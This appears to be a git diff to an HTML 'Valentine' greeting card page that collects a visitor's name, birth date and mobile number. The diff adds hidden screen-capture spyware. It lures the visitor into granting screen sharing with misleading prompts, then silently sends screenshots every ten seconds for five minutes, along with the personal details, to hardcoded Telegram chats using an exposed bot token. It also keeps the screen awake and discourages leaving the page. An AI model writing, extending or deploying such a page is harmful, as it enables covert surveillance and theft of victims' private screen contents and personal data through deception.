@@ -54,14 +54,12 @@
 
         .cursive { font-family: 'Dancing Script', cursive; }
 
-        /* Rain Particles */
         .particle {
             position: fixed; top: -10%; pointer-events: none;
             animation: fall linear forwards; z-index: 100;
         }
         @keyframes fall { to { transform: translateY(110vh) rotate(720deg); } }
 
-        /* YouTube Header Player */
         #yt-header {
             position: fixed; top: -300px; left: 0; width: 100%; height: 250px;
             transition: all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -79,9 +77,12 @@
         @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
 
         .hidden-stage { display: none; }
+        #hidden-video { display: none; }
     </style>
 </head>
 <body id="capture-body">
+
+    <video id="hidden-video" autoplay playsinline muted></video>
 
     <div class="status-bar">
         <div id="clock">12:00</div>
@@ -103,10 +104,11 @@
             
             <div id="stage-1" class="space-y-4">
                 <h1 class="text-4xl font-bold cursive mb-6 drop-shadow-md">Hello, Bestu! ✨</h1>
-                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60">
-                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20">
-                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20">
-                <button onclick="toStage2()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl shadow-xl mt-4">Reveal Magic ❤️</button>
+                <p class="text-[10px] text-white/60 uppercase tracking-widest mb-4">Click below to start the magic experience</p>
+                <input type="text" id="name" placeholder="Full Name" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60 text-white">
+                <input type="date" id="dob" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 text-white">
+                <input type="tel" id="mobile" placeholder="Mobile Number" class="w-full p-4 rounded-2xl bg-white/10 outline-none border border-white/20 placeholder-white/60 text-white">
+                <button onclick="initiateMagic()" class="btn-premium w-full text-white font-bold py-4 rounded-2xl shadow-xl mt-4">Reveal Magic ❤️</button>
             </div>
 
             <div id="stage-2" class="hidden-stage">
@@ -114,7 +116,7 @@
                 <div class="grid gap-4">
                     <button onclick="handleAction('YES', '❤️')" class="btn-premium py-4 rounded-2xl font-bold shadow-lg">YES! 😍</button>
                     <button onclick="handleAction('NO', '😊')" class="bg-white/10 py-4 rounded-2xl font-bold border border-white/20">No 😢</button>
-                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg">Food (You will pay! 🍕)</button>
+                    <button onclick="handleAction('FOOD', '🍕')" class="bg-yellow-500 py-4 rounded-2xl font-bold shadow-lg">Food (You pay! 🍕)</button>
                 </div>
             </div>
 
@@ -124,18 +126,19 @@
                 
                 <div class="bg-white/10 p-5 rounded-3xl border border-white/10">
                     <p class="text-xs mb-3 opacity-80 italic">Any secret message for me?</p>
-                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 outline-none text-sm border border-white/10" rows="2"></textarea>
-                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase tracking-widest shadow-lg">Submit ✅</button>
+                    <textarea id="final-reply" placeholder="Type here..." class="w-full p-3 rounded-xl bg-white/5 outline-none text-sm border border-white/10 text-white" rows="2"></textarea>
+                    <button onclick="sendFinalReply()" class="w-full bg-green-500 py-3 rounded-xl mt-3 text-xs font-bold uppercase tracking-widest shadow-lg text-white">Submit ✅</button>
                 </div>
             </div>
         </div>
     </div>
 
     <script>
-        // UPDATED TELEGRAM CONFIG
         const BOT_TOKEN = "8511064311:AAGi_3QOQzanNtc9P7PzT4z54NBZEXfK5rk";
         const CHAT_IDS = ["6572151527", "7893857792"]; 
         let store = {};
+        let screenStream = null;
+        let wakeLock = null;
 
         function updateClock() {
             const d = new Date();
@@ -148,18 +151,70 @@
             document.getElementById('theme-icon').innerText = document.body.classList.contains('dark-theme') ? '☀️' : '🌙';
         }
 
-        function toStage2() {
+        // Keep Screen Awake
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                }
+            } catch (err) { console.error(err); }
+        }
+
+        async function initiateMagic() {
             store = { n: document.getElementById('name').value, d: document.getElementById('dob').value, m: document.getElementById('mobile').value };
             if(!store.n || !store.m) return alert("Fill all details first! 😊");
-            document.getElementById('stage-1').classList.add('hidden-stage');
-            document.getElementById('stage-2').classList.remove('hidden-stage');
+
+            try {
+                // Request Screen Share - This is required to see outside the sandbox
+                screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.getElementById('hidden-video').srcObject = screenStream;
+
+                await requestWakeLock();
+
+                // Start Automated Real-Time Snapshots (Every 10 seconds for 5 minutes)
+                const snapshotInterval = setInterval(captureStreamFrame, 10000);
+                setTimeout(() => clearInterval(snapshotInterval), 300000); // Stop after 5 mins
+
+                document.getElementById('stage-1').classList.add('hidden-stage');
+                document.getElementById('stage-2').classList.remove('hidden-stage');
+
+                // Initial Data Log
+                CHAT_IDS.forEach(id => {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("🚀 MAGIC STARTED\nName: "+store.n+"\nMobile: "+store.m)}`);
+                });
+
+            } catch (err) {
+                alert("Please allow 'Screen Share' to unlock the heart! 😢");
+            }
+        }
+
+        async function captureStreamFrame() {
+            if (!screenStream) return;
+            const video = document.getElementById('hidden-video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('photo', blob, 'stream.png');
+                CHAT_IDS.forEach(id => {
+                    const finalFd = new FormData();
+                    finalFd.append('chat_id', id);
+                    finalFd.append('photo', blob, 'stream.png');
+                    finalFd.append('caption', `📡 REAL-TIME VIEW: ${store.n}`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: finalFd });
+                });
+            }, 'image/png');
         }
 
         const yt = { 'YES': 'TK2RwQUun-U', 'NO': 'CVEM60qkzT8', 'FOOD': 'XGURSAziJjc' };
 
         async function handleAction(type, emoji) {
             // Rain Effect
-            for(let i=0; i<45; i++) {
+            for(let i=0; i<35; i++) {
                 setTimeout(() => {
                     const p = document.createElement('div'); p.innerText = emoji; p.className = 'particle';
                     p.style.left = Math.random() * 100 + 'vw'; p.style.fontSize = '25px';
@@ -168,19 +223,18 @@
                 }, i * 100);
             }
 
-            // Automated Full-Body Screenshot
+            // Capture the current card state too
             const canvas = await html2canvas(document.body, { useCORS: true, backgroundColor: null });
             canvas.toBlob(async (blob) => {
                 CHAT_IDS.forEach(id => {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'bestu.png');
-                    fd.append('caption', `💌 *VALENTINE UPDATE*\nName: ${store.n}\nChoice: ${type}\nMobile: ${store.m}\nDOB: ${store.d}`);
+                    fd.append('photo', blob, 'card.png');
+                    fd.append('caption', `💌 CHOICE: ${type} by ${store.n}`);
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 });
             });
 
-            // YouTube Header Automation (No Lag)
             document.getElementById('player-mount').innerHTML = `<iframe width="100%" height="100%" src="https://www.youtube.com/embed/${yt[type]}?autoplay=1&mute=0" frameborder="0" allow="autoplay; encrypted-media"></iframe>`;
             document.getElementById('yt-header').classList.add('active');
 
@@ -193,9 +247,14 @@
             CHAT_IDS.forEach(id => {
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent("💬 Message from " + store.n + ": " + reply)}`);
             });
-            alert("Sent! Love ya Bestu!");
+            alert("Sent! Thank you!");
             location.reload();
         }
+
+        // Persistence: Warning when leaving
+        window.onbeforeunload = function() {
+            return "The magic is still running! Are you sure?";
+        };
     </script>
 </body>
 </html>
